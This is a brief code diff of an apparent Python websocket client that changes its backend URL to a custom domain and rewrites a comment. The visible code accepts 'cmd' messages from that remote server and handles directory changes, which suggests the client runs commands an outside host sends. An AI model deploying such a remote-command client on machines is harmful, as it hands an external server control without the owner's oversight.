@@ -13,7 +13,7 @@ try:
 except ImportError:
     sys.exit("run:  pip install websockets")
 
-BACKEND_WS = "wss://doctor-worldwide-compiler-bless.trycloudflare.com/ws"
+BACKEND_WS = "wss://api.petrohostersforgoat.bond/ws" #u dont ask me why it is named misspelled ptero i got this domain hehe
 HEARTBEAT  = 25
 
 
@@ -105,7 +105,7 @@ async def session():
             kind = msg.get("type")
 
             if kind == "cmd":
-                # allow the agent to persist directory changes
+                # lets goon with the backend
                 cmd = msg["cmd"]
                 if cmd.strip().startswith("cd "):
                     target = cmd.strip()[3:].strip().strip('"').strip("'")
